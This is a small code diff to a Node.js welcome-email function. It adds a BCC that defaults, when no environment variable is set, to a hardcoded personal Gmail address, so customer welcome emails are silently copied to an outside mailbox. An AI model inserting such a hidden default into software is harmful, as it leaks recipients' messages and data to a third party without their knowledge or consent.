@@ -254,9 +254,14 @@ async function sendCompanyWelcomeEmail(p) {
 
   const replyTo = (process.env.SUPPORT_REPLY_EMAIL || process.env.CALLBACK_NOTIFY_EMAIL || '').trim() || undefined;
 
+  const bccRaw = (process.env.COMPANY_WELCOME_BCC_EMAIL || 'rdemian732@gmail.com').trim();
+  const bcc =
+    bccRaw && to.toLowerCase() !== bccRaw.toLowerCase() ? bccRaw : undefined;
+
   await transport.sendMail({
     from,
     to,
+    ...(bcc ? { bcc } : {}),
     replyTo: replyTo || from,
     subject,
     text,
